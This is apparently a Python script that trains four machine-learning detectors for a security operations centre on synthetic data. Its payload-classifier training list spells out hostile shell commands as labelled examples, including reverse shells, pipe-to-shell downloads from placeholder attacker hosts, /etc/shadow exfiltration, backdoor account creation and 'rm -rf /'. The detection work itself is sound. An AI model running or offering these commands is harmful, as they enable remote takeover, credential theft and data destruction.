"""
SOC Model Artifacts Generator
Trains and exports baseline pre-trained scikit-learn models to `backend/artifacts/`.

Artifacts generated:
1. isolation_forest_beth.joblib & scaler.joblib (Host Behavior Isolation Forest)
2. payload_classifier.joblib & tfidf_vectorizer.joblib (NLP Payload Classifier)
3. network_ids_model.joblib & network_scaler.joblib & network_encoders.joblib (NSL-KDD Random Forest)
4. auth_anomaly_model.joblib & auth_scaler.joblib (CERT User Behavior Isolation Forest)
"""

import os
from pathlib import Path
import numpy as np
import pandas as pd
import joblib

from sklearn.ensemble import IsolationForest, RandomForestClassifier
from sklearn.linear_model import LogisticRegression
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.preprocessing import StandardScaler, LabelEncoder

ARTIFACTS_DIR = Path(__file__).resolve().parent / "artifacts"
ARTIFACTS_DIR.mkdir(parents=True, exist_ok=True)

def generate_host_beth_artifacts():
    print("[1/4] Training BETH Host Behavioral Isolation Forest & Scaler...")
    np.random.seed(42)
    # 8 features: processId, parentProcessId, userId, mountNamespace, eventId, argsNum, returnValue, suspendCount
    n_samples = 1500
    normal_data = np.column_stack([
        np.random.randint(1000, 30000, n_samples),     # processId
        np.random.randint(500, 2500, n_samples),       # parentProcessId
        np.random.choice([1000, 1001, 1002], n_samples),# userId (normal non-root)
        np.full(n_samples, 4026531840),                # mountNamespace
        np.random.choice([3, 5, 59, 257], n_samples),  # eventId
        np.random.randint(1, 4, n_samples),            # argsNum
        np.zeros(n_samples),                           # returnValue (0 = success)
        np.zeros(n_samples)                            # suspendCount
    ])
    
    # 5% anomalous training injections
    anomalous_data = np.column_stack([
        np.random.randint(1, 100, 75),                 # low processId
        np.ones(75),                                   # ppid 1
        np.zeros(75),                                  # uid 0 (root)
        np.full(75, 4026531840),
        np.random.choice([101, 157, 165, 313], 75),    # ptrace, init_module
        np.random.randint(5, 12, 75),                  # large args
        np.random.choice([-1, -2, -13], 75),           # errors (permission denied)
        np.random.randint(1, 4, 75)
    ])
    
    X = np.vstack([normal_data, anomalous_data])
    scaler = StandardScaler()
    X_scaled = scaler.fit_transform(X)

    iso_forest = IsolationForest(n_estimators=100, contamination=0.08, random_state=42)
    iso_forest.fit(X_scaled)

    joblib.dump(iso_forest, ARTIFACTS_DIR / "isolation_forest_beth.joblib")
    joblib.dump(scaler, ARTIFACTS_DIR / "scaler.joblib")
    print("   -> Saved isolation_forest_beth.joblib and scaler.joblib")


def generate_payload_nlp_artifacts():
    print("[2/4] Training NLP Payload TF-IDF Vectorizer & Logistic Regression...")
    benign_payloads = [
        "ls -la /var/log/nginx/",
        "python3 -m pip install -r requirements.txt",
        "git pull origin main",
        "curl -s https://api.internal.corp/health",
        "cat /etc/hosts",
        "systemctl status docker",
        "node server.js --port 3000",
        "docker run -d -p 8080:80 nginx:alpine",
        "grep -rn 'ERROR' /var/log/syslog",
        "htop -d 10",
        "npm run build",
        "ps aux | grep redis",
        "tar -czvf backup.tar.gz /data/www",
        "find . -name '*.py' -type f",
        "echo 'Deployment complete'",
        "whoami",
        "uname -a",
        "ping -c 3 8.8.8.8",
        "df -h",
        "free -m"
    ] * 25

    malicious_payloads = [
        "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "nc -e /bin/sh 192.168.1.100 9001",
        "curl -s http://malware-c2.net/payload.sh | bash",
        "wget -qO- http://bad.actor/rootkit.elf | sh",
        "chmod 777 /etc/shadow && cat /etc/shadow",
        "echo 'root:compromised' | chpasswd",
        "iptables -F && iptables -X",
        "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "rm -rf / --no-preserve-root",
        "useradd -m -s /bin/bash hacker && echo 'hacker:pwned' | chpasswd && usermod -aG sudo hacker",
        "powershell -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtAA==",
        "find / -perm -u=s -type f 2>/dev/null",
        "cat /etc/shadow | base64 -w 0 | curl -X POST -d @- http://c2.xyz/loot",
        "perl -e 'use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
        "echo '* * * * * root /tmp/rev.sh' >> /etc/crontab"
    ] * 30

    texts = benign_payloads + malicious_payloads
    labels = [0] * len(benign_payloads) + [1] * len(malicious_payloads)

    tfidf = TfidfVectorizer(max_features=500, ngram_range=(1, 2), token_pattern=r"(?u)\b\w+\b|[^\w\s]")
    X_tfidf = tfidf.fit_transform(texts)

    clf = LogisticRegression(C=1.5, max_iter=200, random_state=42)
    clf.fit(X_tfidf, labels)

    joblib.dump(clf, ARTIFACTS_DIR / "payload_classifier.joblib")
    joblib.dump(tfidf, ARTIFACTS_DIR / "tfidf_vectorizer.joblib")
    print("   -> Saved payload_classifier.joblib and tfidf_vectorizer.joblib")


def generate_network_nsl_kdd_artifacts():
    print("[3/4] Training NSL-KDD Network Random Forest, Scaler & Encoders...")
    np.random.seed(42)
    
    protocols = ["tcp", "udp", "icmp"]
    services = ["http", "private", "smtp", "ftp_data", "other", "telnet", "eco_i", "finger"]
    flags = ["sf", "s0", "rej", "rsto", "rstos0", "rstr", "s1", "s2", "s3"]

    encoders = {
        "protocol_type": {p: i for i, p in enumerate(protocols)},
        "service": {s: i for i, s in enumerate(services)},
        "flag": {f: i for i, f in enumerate(flags)}
    }

    n_samples = 1200
    # Generate balanced synthetic flow features matching NSL-KDD
    X_raw = []
    y = []

    for _ in range(n_samples // 2):
        # Benign connection
        proto = np.random.choice([0, 1])  # tcp/udp
        serv = np.random.choice([0, 2, 3]) # http, smtp, ftp
        flg = 0 # SF
        duration = np.random.exponential(2.0)
        src_bytes = np.random.randint(100, 5000)
        dst_bytes = np.random.randint(500, 25000)
        count = np.random.randint(1, 15)
        srv_count = np.random.randint(1, 15)
        serror = 0.0
        rerror = 0.0
        # 3 cat + 30 num = 33 features
        num_feats = [duration, src_bytes, dst_bytes, 0, 0, 0, 0, 1, 0, 0, 0, count, srv_count, serror, serror, rerror, rerror, 1.0, 0.0, 0.0, 10, 10, 1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0]
        X_raw.append([proto, serv, flg] + num_feats)
        y.append(0)

    for _ in range(n_samples // 2):
        # Intrusion (SYN flood / portscan / brute)
        attack_kind = np.random.choice(["dos", "probe", "r2l", "u2r"])
        if attack_kind == "dos":
            proto, serv, flg = 0, 1, 1 # tcp, private, S0
            count, srv_count = np.random.randint(100, 400), np.random.randint(100, 400)
            serror = np.random.uniform(0.7, 1.0)
            num_feats = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, count, srv_count, serror, serror, 0.0, 0.0, 1.0, 0.0, 0.0, 255, 255, 1.0, 0.0, 0.0, 0.0, serror, serror, 0.0, 0.0]
        elif attack_kind == "probe":
            proto, serv, flg = 0, 4, 2 # tcp, other, REJ
            count = np.random.randint(50, 200)
            diff_srv = np.random.uniform(0.6, 1.0)
            num_feats = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, count, 2, 0.0, 0.0, 0.8, 0.8, 0.1, diff_srv, 0.0, 255, 5, 0.02, 0.8, 0.0, 0.0, 0.0, 0.0, 0.8, 0.8]
        elif attack_kind == "u2r":
            proto, serv, flg = 0, 5, 0 # telnet, SF
            num_feats = [15, 2500, 12000, 0, 1, 3, 0, 1, 2, 1, 1, 2, 2, 0, 0, 0, 0, 1, 0, 0, 5, 5, 1, 0, 0, 0, 0, 0, 0, 0]
        else: # r2l
            proto, serv, flg = 0, 5, 0
            failed = np.random.randint(3, 8)
            num_feats = [5, 450, 300, 0, 0, 0, failed, 0, 0, 0, 0, 8, 8, 0, 0, 0, 0, 1, 0, 0, 20, 20, 1, 0, 0, 0, 0, 0, 0, 0]

        X_raw.append([proto, serv, flg] + num_feats)
        y.append(1)

    X_mat = np.array(X_raw, dtype=np.float32)
    scaler = StandardScaler()
    X_scaled = scaler.fit_transform(X_mat)

    rf = RandomForestClassifier(n_estimators=100, max_depth=12, random_state=42)
    rf.fit(X_scaled, y)

    joblib.dump(rf, ARTIFACTS_DIR / "network_ids_model.joblib")
    joblib.dump(scaler, ARTIFACTS_DIR / "network_scaler.joblib")
    joblib.dump(encoders, ARTIFACTS_DIR / "network_encoders.joblib")
    print("   -> Saved network_ids_model.joblib, network_scaler.joblib, and network_encoders.joblib")


def generate_auth_cert_artifacts():
    print("[4/4] Training CERT User Behavior Isolation Forest & Scaler...")
    np.random.seed(42)
    n_samples = 1500

    # 8 features: login_hour, is_weekend, failed_logins, usb_device_connected, files_accessed, data_transfer_mb, privileged_commands_count, after_hours_activity
    # Normal employee behaviors: 9 to 17 hrs, weekdays, 0 failed logins, 0 USB, ~20 files, ~10 MB
    login_hours = np.random.normal(loc=11.5, scale=2.5, size=n_samples).clip(8, 18)
    is_weekend = np.zeros(n_samples)
    failed_logins = np.random.choice([0, 1], p=[0.92, 0.08], size=n_samples)
    usb = np.zeros(n_samples)
    files = np.random.gamma(shape=4.0, scale=6.0, size=n_samples).clip(2, 60)
    data_mb = np.random.exponential(scale=12.0, size=n_samples).clip(1, 50)
    priv_cmds = np.zeros(n_samples)
    after_hours = np.zeros(n_samples)

    normal_matrix = np.column_stack([
        login_hours, is_weekend, failed_logins, usb, files, data_mb, priv_cmds, after_hours
    ])

    scaler = StandardScaler()
    scaled_auth = scaler.fit_transform(normal_matrix)

    auth_forest = IsolationForest(n_estimators=120, contamination=0.06, random_state=42)
    auth_forest.fit(scaled_auth)

    joblib.dump(auth_forest, ARTIFACTS_DIR / "auth_anomaly_model.joblib")
    joblib.dump(scaler, ARTIFACTS_DIR / "auth_scaler.joblib")
    print("   -> Saved auth_anomaly_model.joblib and auth_scaler.joblib")


if __name__ == "__main__":
    print(f"Generating SOC machine learning artifacts in: {ARTIFACTS_DIR}")
    generate_host_beth_artifacts()
    generate_payload_nlp_artifacts()
    generate_network_nsl_kdd_artifacts()
    generate_auth_cert_artifacts()
    print("All 6 SOC artifact sets generated successfully!")

